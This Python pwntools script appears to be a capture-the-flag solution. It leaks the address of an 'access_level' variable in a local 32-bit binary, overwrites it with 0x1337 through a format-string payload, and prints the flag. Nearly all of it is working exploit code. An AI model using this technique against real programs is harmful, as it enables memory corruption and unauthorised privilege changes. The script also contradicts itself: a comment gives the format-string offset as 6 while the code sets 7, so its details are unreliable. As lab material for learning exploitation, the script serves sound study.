#!/usr/bin/env python3
from pwn import *

# Set the context by loading the ELF file. Pwntools will automatically detect
# that this is a 32-bit binary (i386 architecture).
context.binary = elf = ELF('./vuln')
context.log_level = 'info'

# --- EXPLOIT ---
def exploit():
    # Start the local process
    p = process(elf.path)

    # 1. Receive the banner and parse the 32-bit target address
    p.recvuntil(b'value at ')
    addr_access_level = int(p.recvline().strip(), 16)
    log.info(f"Target address (access_level) found: {hex(addr_access_level)}")

    # 2. Determine the format string offset. For this binary, it's 6.
    # This can be found by sending a test payload like "AAAA.%p.%p.%p..."
    offset = 7

    # 3. Craft the payload. Pwntools will generate a 32-bit compatible payload.
    # We want to write the value 0x1337 to the address of `access_level`.
    payload = fmtstr_payload(offset, {addr_access_level: 0x1337})
    log.info(f"Generated format string payload: {payload}")

    # 4. Send the payload and get the flag
    p.sendlineafter(b'> ', payload)
    
    p.recvuntil(b'Congratulations!')
    flag = p.recvall()
    log.success(f"Flag: {flag.decode().strip()}")

    p.close()

if __name__ == "__main__":
    exploit()
